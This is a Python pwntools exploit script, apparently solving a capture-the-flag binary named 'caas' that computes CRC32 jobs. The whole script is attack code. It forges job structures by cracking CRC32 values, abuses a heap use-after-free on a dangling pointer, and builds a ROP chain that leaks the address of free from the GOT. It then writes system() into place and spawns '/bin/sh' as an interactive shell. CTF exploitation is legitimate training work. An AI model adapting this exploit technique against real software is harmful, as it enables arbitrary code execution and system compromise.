from pwn import *

g_local = False
if g_local:
	sh=process("./caas")
	WORKER1_ADDR = 0x1170#0x570
	WORKER2_ADDR = 37592#0x86d8
	WORKER1_SIGN = 0x170#0x570
	JOB1_CONTENT_ADDR = 0x11440#0x10840
	JOB2_CONTENT_ADDR = 0x11500#0x10900
	SYSTEM_ADDR = 0x0003ada0#0x3ada0
	FREE_ADDR = 0x71470#0x71470
else:
	sh=process("/problems/4e35adf4276b6c2f727f265de95d588b/caas")
	WORKER1_ADDR = 0x168
	WORKER2_ADDR = 0x82d0
	WORKER1_SIGN = WORKER1_ADDR
	JOB1_CONTENT_ADDR = 0x10438
	JOB2_CONTENT_ADDR = 0x104f8
	SYSTEM_ADDR = 0x3e3e0
	FREE_ADDR = 0x76110

heap_base_addr = None

MAIN_EBP_ADDR = 0x034


CHUNK_SIZE = 128

crc32_to_bytes = {}

def crack_crc32(crc32val):
	global crc32_to_bytes
	if (crc32val in crc32_to_bytes):
		return crc32_to_bytes[crc32val]
	cracksh = process("./crack_crc32")
	cracksh.send(str(crc32val) + "\n")
	ret = p32(int(cracksh.recv(), 16))
	cracksh.close()
	crc32_to_bytes[crc32val] = ret
	return ret

def parse_addr(addr_str):
	if (len(addr_str) >= 4):
		return u32(addr_str[:4])
	else:
		return u32(addr_str + "\x00" * (4 - len(addr_str)))

def request_crc32_comp(data):
	sh.send("1\n")
	sh.recvuntil("Size: ")
	sh.send(str(len(data)) + "\n")
	sh.recvuntil("Contents:\n")
	sh.send(data)
	sh.recvuntil("> ")

def add_worker():
	global heap_base_addr
	sh.send("2\n")
	sh.recvuntil("Starting Worker #")
	worker_addr = sh.recvuntil("> ")
	worker_addr = int(worker_addr[:8], 16)
	if (worker_addr & 0xfff) == WORKER1_SIGN:
		heap_base_addr = worker_addr - WORKER1_ADDR

def yield_worker():
	sh.send("3\n")
	print sh.recvuntil("> ")

def toggle_worker(worker_id):
	sh.send("4\n")
	sh.recvuntil("Worker ID: #")
	sh.send(hex(worker_id)[2:] + "\n")
	print sh.recvuntil("> ")

def gather_results():
	sh.send("5\n")
	print sh.recvuntil("> ")


# struct job {
#   unsigned int id;
#   unsigned int len = 4;
#   unsigned char *input = +0x10;
#   unsigned int *result = &ebp of main context = heap + 0x34;
# bytes:
#   need to be crc32 to address of 2nd job chunk
def make_job1_payload(chunk_addr, displacement):
	job_id = p32(0) #id, not useful
	length = p32(4) #going to calculate 4 bytes
	result = p32(MAIN_EBP_ADDR + heap_base_addr)
	ret = job_id + length + p32(chunk_addr+16) + result + \
		(crack_crc32(JOB2_CONTENT_ADDR + heap_base_addr + displacement))
	ret += "\x90" * (CHUNK_SIZE - len(ret))
	assert (len(ret) == CHUNK_SIZE)
	return ret


# 2nd job content addr: 0x805b900
# 2nd job chunk size 0x100 = 128
# +0x00:
#   +0x10 ebp
#   0x8048520 puts addr
#   0x8048618 leave/ret addr
#   0x804A5E8 got addr of free
# +0x10:
#   +0x24 ebp
#   0x8048590 scanf addr
#   0x8048618 leave/ret addr
#   "%x" addr
#   +0x28 some position in this chunk
# +0x24:
#   0 ;ebp
# +0x28
#   0 ;to be modified
#   0
#   +0x34 "/bin/sh" addr
# +0x34:
#   "/bin/sh"
# +0x3c:
#   "%x\x00\x00"
# +0x40:
def make_job2_payload(chunk_addr):
	payload_size = 0x40
	length_begin = CHUNK_SIZE - payload_size
	leave_ret = p32(0x8048618)
	payload_start = chunk_addr + length_begin
	ret = p32(payload_start + 0x10)
	ret += p32(0x8048520)
	ret += leave_ret
	ret += p32(0x804A5E8)
	ret += p32(payload_start + 0x24)
	ret += p32(0x8048590)
	ret += leave_ret
	ret += p32(payload_start + 0x3c)
	ret += p32(payload_start + 0x28)
	ret += p32(0)
	ret += p32(0)
	ret += p32(0)
	ret += p32(payload_start + 0x34)
	ret += "/bin/sh\x00"
	ret += "%x\x00\x00"

	ret = "\x90" * length_begin + ret
	assert (len(ret) == CHUNK_SIZE)
	return ret,length_begin

add_worker()
add_worker()


job2_payload, displacement = make_job2_payload(JOB2_CONTENT_ADDR + heap_base_addr)
job1_payload = make_job1_payload(JOB1_CONTENT_ADDR + heap_base_addr, displacement)
request_crc32_comp(job1_payload)
request_crc32_comp(job2_payload)

yield_worker()

toggle_worker(WORKER2_ADDR + heap_base_addr)

yield_worker()
yield_worker()

gather_results()

request_crc32_comp("C" * CHUNK_SIZE)

toggle_worker(WORKER2_ADDR + heap_base_addr)

yield_worker()

toggle_worker(WORKER2_ADDR + heap_base_addr)

#now job_stack is dangling pointer pointing to chunk in fastbin

request_crc32_comp(crack_crc32(JOB1_CONTENT_ADDR + heap_base_addr))

yield_worker()
yield_worker()

sh.send("3\n")



sh.recvuntil("Getting Job\n")
got_info = sh.recv()
free_addr = parse_addr(got_info)
print "free addr: " + hex(free_addr)
system_addr = free_addr - FREE_ADDR + SYSTEM_ADDR
print "system addr: " + hex(system_addr)

sh.send(hex(system_addr)[2:] + "\n")

sh.interactive()